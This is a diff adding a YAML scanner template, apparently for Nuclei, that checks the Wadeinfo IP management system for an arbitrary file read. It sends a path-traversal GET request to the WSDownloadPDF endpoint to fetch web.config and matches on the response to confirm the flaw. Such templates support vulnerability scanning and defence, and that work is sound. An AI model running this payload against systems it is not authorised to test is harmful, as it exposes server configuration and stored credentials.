@@ -1,0 +1,28 @@
+id: poc-yaml-wadeinfo-ipms-wsdownloadpdf-anyfile-read
+info:
+  name: 唯徳知识产权管理系统 WSDownloadPDF 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</system.web>"
+          - "<configuration>"
+        part: body
+      - type: word
+        words:
+          - "filename=web.config"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
